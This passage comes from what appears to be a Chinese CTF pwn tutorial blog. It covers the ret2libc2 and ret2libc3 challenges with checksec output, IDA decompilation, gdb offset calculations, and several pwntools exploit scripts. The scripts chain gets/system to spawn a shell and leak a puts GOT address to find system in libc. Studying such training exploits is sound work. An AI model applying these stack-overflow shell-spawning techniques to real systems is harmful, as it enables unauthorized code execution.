class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]</span><br><span class="line">└─# checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/root/Desktop/PWN/ret2libc2/ret2libc2&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>允许栈溢出，NX防护开启，PIE防护关闭</p><h3 id="IDA分析-4"><a href="#IDA分析-4" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets函数很明显，肯定是要栈溢出，其他信息没多少，在函数列表中又找到一个<code>secure</code>函数，内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有<code>system</code>函数，但是里面的参数不是想要的，因为是动态链接库，可以直接掉system的plt，参数在f12中也没找到，这题重要的时候需要自己构建一个“&#x2F;bin&#x2F;sh”字符串，这个程序里因为是动态链接库，所有的运行函数都可以去调用，我们可以尝试使用gets函数自己构建一个，但是这得找程序中可以写的变量地址，在bss段中找到了一个<code>buf2</code>的变量，在bss中的变量都可写的，他的地址是<code>0x0804A080</code>。</p><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>使用<code>gets</code>函数把<code>/bin/sh</code>写入buf2,再把<code>buf2</code>传入<code>system</code>函数。</p><h3 id="溢出长度-4"><a href="#溢出长度-4" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>使用gdb调式，内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────</span><br><span class="line">*EAX  0xffffd0ec ◂— &#x27;hello&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line">*ECX  0xf7fa08ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffd0d0 —▸ 0xffffd0ec ◂— &#x27;hello&#x27;</span><br><span class="line">*EIP  0x80486bf (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure><p>栈溢出位数应该是0xd158-0xd0ec+4&#x3D;112</p><h3 id="攻击脚本-2"><a href="#攻击脚本-2" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, gets_plt,system_plt,buf2,buf2 ])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(sh)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>上面这个脚本只是一次性攻击脚本，就是说这个脚本只是适用于当前，单反多一个命令他都无法执行，下面给一个可以执行多次的脚本，就是真正可以一直操控程序执行流</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843D</span></span><br><span class="line">buf2 = <span class="number">0x804A080</span></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0x0</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>上面脚本多加了一个pop_ebx的内容，当执行完gets之后，他的栈和执行的过程是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405153820.png"><br>执行完这一步就开始pop ebx了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250405153844.png"><br>执行完pop_ebx之后顺带会把buf2弹出栈，走到system_plt，执行到这一步刚好也走到ret，一ret就执行到system了，后面也可以通过这个思路来去继续构造命令。</p><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><h3 id="题目来源-5"><a href="#题目来源-5" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://github.com/scwuaptx/HITCON-Training/blob/cb60f23e444a0639c3872f205dd28cb04190de16/LAB/lab4/ret2lib">https://github.com/scwuaptx/HITCON-Training/blob/cb60f23e444a0639c3872f205dd28cb04190de16/LAB/lab4/ret2lib</a><br>PS：内容来自于<img src="https://avatars.githubusercontent.com/u/3533327?s=48&v=4" alt="Owner avatar"><a href="https://github.com/scwuaptx/HITCON-Training">HITCON-Training</a></p><h3 id="文件类型-5"><a href="#文件类型-5" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]</span><br><span class="line">└─# file ret2lib</span><br><span class="line">ret2lib: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID\[sha1]=c74b2683d6d3b99439c3e04d6d81b233e6a3b1b6, not stripped</span><br></pre></td></tr></table></figure><p>动态链接库编译的ELF文件</p><h3 id="软件防护-3"><a href="#软件防护-3" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc3]</span><br><span class="line">└─# checksec ret2lib</span><br><span class="line">[*] <span class="string">&#x27;/root/Desktop/PWN/ret2libc3/ret2lib&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>只是开启了NX防护<br>允许栈溢出，NX防护开启，PIE防护关闭</p><h3 id="IDA分析-5"><a href="#IDA分析-5" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> **v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">10u</span>);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">void</span> **)strtol(buf, v4, v5);</span><br><span class="line">  See_something(v8);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, src, <span class="number">0x100u</span>);</span><br><span class="line">  Print_message(src);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个问题，就是得绕过一个位置，那就是下面这两行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="type">char</span> **v4; <span class="comment">// [esp+4h] [ebp-11Ch]</span></span><br><span class="line"><span class="type">int</span> v5; <span class="comment">// [esp+8h] [ebp-118h]</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [esp+112h] [ebp-Eh] BYREF</span></span><br><span class="line"><span class="type">const</span> <span class="type">void</span> **v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line">......</span><br><span class="line">v8 = (<span class="type">const</span> <span class="type">void</span> **)strtol(buf, v4, v5);</span><br><span class="line">See_something(v8);</span><br></pre></td></tr></table></figure><p>其中<code>See_something</code>的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">See_something</span><span class="params">(<span class="type">const</span> <span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strtol</code>在这里的作用是把字符串转换为长整型，然后传给See_something函数，他拿到之后把他当作一个内存地址输出内容了，这里如果是输入的<code>buf2</code>内容不是数字会报错，如果输入的内容在程序中不是字符串或者说是不能通过<code>%p</code>输出出来那就会报错，绕过这两个才可以继续操作，后面的代码内容是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [esp+12h] [ebp-10Eh] BYREF</span></span><br><span class="line">......</span><br><span class="line">read(<span class="number">0</span>, src, <span class="number">0x100u</span>);</span><br><span class="line">Print_message(src);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>读了一<code>0x100</code>大小的数据，转换成10进制就是256大小，放到了src中，之后把这个src丢到了Print_message中，Print_message的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Print_message</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出就发生在这个函数中，他竟然把src的内容复制到了dest中，dest这个大小只有56位，但是src的大小是256，这样就产生了栈溢出。</p><h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>第一步绕过虽然可以使用随便一个地址进行绕过，但是他这里不是为了让单纯绕过的，因为是动态链接库运行的程序我们需要通过这个方法溢出一下真实的函数地址，然后计算便宜位置找到<code>system()</code>函数的位置。找到这个位置之后再根据提供的so文件计算出偏移地址，再根据本地的链接库和偏移的地址拿到真实的<code>system()</code>函数位置。拿到之后通过执行<code>sh</code>字符串拿到shell，<code>sh</code>字符串可以直接通过python中的elf.search来搜索，在程序本身是又sh相关的字符串的，位置是在<code>0x0804829A</code>,他是fflush函数的名字,他的后缀有<code>sh</code>字样。</p><h3 id="溢出长度-5"><a href="#溢出长度-5" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>使用gdb进行调试，断点打开<code>Print_message</code>，让其一直运行到strcpy之后，再去查看dest到ebp的位数，gdb调试返回内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">n</span></span><br><span class="line">0x08048568 in Print_message ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line"> ECX  0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EDX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048670 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd028 —▸ 0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048556 &lt;Print_message+6&gt;     mov    eax, dword ptr [ebp + 8]     EAX, [0xffffd030] =&gt; 0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">   0x8048559 &lt;Print_message+9&gt;     mov    dword ptr [esp + 4], eax     [0xffffcfe4] =&gt; 0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">   0x804855d &lt;Print_message+13&gt;    lea    eax, [ebp - 0x38]            EAX =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0</span><br><span class="line">   0x8048560 &lt;Print_message+16&gt;    mov    dword ptr [esp], eax         [0xffffcfe0] =&gt; 0xffffcff0 —▸ 0xf7f9e7a8 (_IO_file_jumps) ◂— 0</span><br><span class="line">   0x8048563 &lt;Print_message+19&gt;    call   strcpy@plt                  &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► 0x8048568 &lt;Print_message+24&gt;    lea    eax, [ebp - 0x38]              EAX =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)</span><br><span class="line">   0x804856b &lt;Print_message+27&gt;    mov    dword ptr [esp + 4], eax       [0xffffcfe4] =&gt; 0xffffcff0 ◂— 0x6168696e (&#x27;niha&#x27;)</span><br><span class="line">   0x804856f &lt;Print_message+31&gt;    mov    dword ptr [esp], 0x8048721     [0xffffcfe0] =&gt; 0x8048721 ◂— pop ecx /* &#x27;Your message is : %s&#x27; */</span><br><span class="line">   0x8048576 &lt;Print_message+38&gt;    call   printf@plt                  &lt;printf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804857b &lt;Print_message+43&gt;    leave</span><br><span class="line">   0x804857c &lt;Print_message+44&gt;    ret</span><br></pre></td></tr></table></figure><p>重点内容是在这段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> EAX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EBX  0xf7f9ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* &#x27;,=&quot;&#x27; */</span><br><span class="line"> ECX  0xffffd042 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EDX  0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048670 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd028 —▸ 0xffffd158 ◂— 0</span><br><span class="line"> ESP  0xffffcfe0 —▸ 0xffffcff0 ◂— &#x27;nihao\n&#x27;</span><br><span class="line">*EIP  0x8048568 (Print_message+24) ◂— lea eax, [ebp - 0x38]</span><br></pre></td></tr></table></figure><p><code>0xffffcff0</code>是dest的位置，<code>0xffffd028</code>是ebp的位置计算出相差位数是56，这里需要+4因为要溢出到返回地址，所以溢出位数是60</p><h3 id="攻击脚本-3"><a href="#攻击脚本-3" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">got_puts_address = <span class="string">&quot;134520860&quot;</span></span><br><span class="line">puts_address = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/usr/lib32/libc.so.6&quot;</span>)</span><br><span class="line">elfio = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,got_puts_address)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line"><span class="comment"># DROP的意思是是否丢掉换行符,拿到的是puts在执行环境中的位置，在去本地环境中拿到puts的地址相减，就可以拿到puts在本地环境和运行环境的偏移量</span></span><br><span class="line">put_address_cheap = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">            <span class="string">b&quot;a&quot;</span> * <span class="number">60</span>,</span><br><span class="line">            put_address_cheap+elf.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">            <span class="comment"># 0xdeadbeef,</span></span><br><span class="line">            <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>,</span><br><span class="line">            <span class="built_in">next</span>(elfio.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br><span class="line">        ])</span><br><span class="line"><span class="comment"># elfio.search返回的是一个迭代器，需要用next来一次性都拿到，这里是拿到&quot;sh&quot;字符串的地址</span></span><br><span class="line"><span class="comment"># next(elfio.search(b&quot;sh\x00&quot;))</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>也可以通过下面这个来去做，下面的这个不需要手动去找got表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">elfio = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;pod.ctf.wlaq&quot;</span>, <span class="string">&quot;30892&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elfio.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>, <span class="built_in">str</span>(puts_got_addr))</span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - elf.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">60</span>,</span><br><span class="line">        elf.symbols[<span class="string">&quot;system&quot;</span>] + offset,</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">4</span>,</span><br><span class="line">        <span class="built_in">next</span>(elfio.search(<span class="string">b&quot;sh\x00&quot;</span>)),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc3-search-libc"><a href="#ret2libc3-search-libc" class="headerlink" title="ret2libc3-search_libc"></a>ret2libc3-search_libc</h2><h3 id="题目来源-6"><a href="#题目来源-6" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a><br>PS：内容来自于CTF-WIKI</p><h3 id="文件类型-6"><a href="#文件类型-6" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(kali㉿kali)-[~/pwn/ret2libc3-libc?]</span><br><span class="line">└─$ file ret2libc3 </span><br><span class="line">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically 